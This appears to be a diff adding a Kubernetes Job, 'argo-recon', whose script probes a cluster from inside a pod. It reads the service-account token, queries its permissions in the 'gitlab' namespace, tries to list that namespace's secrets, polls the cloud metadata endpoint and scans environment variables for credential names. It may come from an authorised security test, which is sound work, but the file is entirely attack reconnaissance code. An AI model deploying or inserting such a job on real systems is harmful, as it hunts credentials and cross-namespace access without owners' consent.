@@ -1,0 +1,33 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: argo-recon
+  namespace: argo-marker-test
+spec:
+  ttlSecondsAfterFinished: 600
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: recon
+        image: alpine:3.20
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          set +e
+          echo "== id =="; id; hostname
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          echo "== ns =="; cat $SA/namespace
+          TOK=$(cat $SA/token); CA=$SA/ca.crt
+          echo "== whoami (selfsubjectrulesreview) =="
+          cat > /tmp/r.json <<JSON
+          {"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"gitlab"}}
+          JSON
+          curl -sk --cacert $CA -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -X POST https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d @/tmp/r.json | head -c 2500
+          echo; echo "== can i list secrets in gitlab? =="
+          curl -sk --cacert $CA -H "Authorization: Bearer $TOK" "https://kubernetes.default.svc/api/v1/namespaces/gitlab/secrets?limit=5" | head -c 800
+          echo; echo "== IMDS =="
+          curl -s -m 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head -5
+          echo "== env creds =="
+          env | grep -iE 'AWS_|TOKEN|SECRET|KUBE' | sed 's/=.*/=<set>/'
+          echo "== podinfo done =="
